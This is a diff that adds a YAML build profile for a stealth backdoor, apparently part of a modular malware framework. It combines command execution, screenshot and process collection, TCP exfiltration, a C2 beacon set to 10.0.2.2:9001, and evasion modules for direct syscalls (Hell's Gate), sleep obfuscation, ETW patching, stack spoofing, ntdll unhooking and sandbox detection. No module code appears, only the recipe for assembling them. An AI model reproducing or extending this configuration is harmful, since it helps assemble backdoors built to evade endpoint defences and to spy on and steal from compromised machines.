@@ -1,0 +1,31 @@
+name: backdoor_stealth_v2
+description: "Backdoor with Hell's Gate syscalls, FOLIAGE sleep, Perun's Fart unhooking, network sandbox check"
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/system_info
+  - collectors/processes
+  - collectors/screenshot
+
+exfil: exfil/tcp_direct
+c2: c2/tcp_beacon
+arch: arch/backdoor
+api_resolve: api_resolve/peb_walk
+resources: true
+
+evasion:
+  - evasion/hells_gate
+  - evasion/sleep_foliage
+  - evasion/etw_patch
+  - evasion/thread_stack_spoof
+  - evasion/unhook_peruns_fart
+  - evasion/anti_sandbox_network
+  - evasion/behavioral_pacing
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
